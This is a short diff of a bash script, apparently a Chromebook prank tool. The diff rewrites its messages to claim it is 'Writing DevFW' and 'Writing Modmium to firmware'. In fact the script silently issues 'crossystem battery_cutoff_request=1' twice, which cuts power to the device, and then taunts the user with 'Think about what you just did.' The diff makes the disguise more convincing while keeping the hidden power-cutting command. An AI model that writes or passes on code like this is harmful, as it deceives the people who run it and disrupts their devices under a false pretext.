@@ -1,8 +1,8 @@
 #!/bin/bash
 
-echo "Sourcing exploit files..."
+echo "Writing DevFW..."
 sleep 1
-echo "Starting bootwrite..."
+echo "Writing Modmium to firmware..."
 crossystem battery_cutoff_request=1 >/dev/null 2>&1 || :
 crossystem battery_cutoff_request=1 >/dev/null 2>&1 || :
 echo "Think about what you just did."
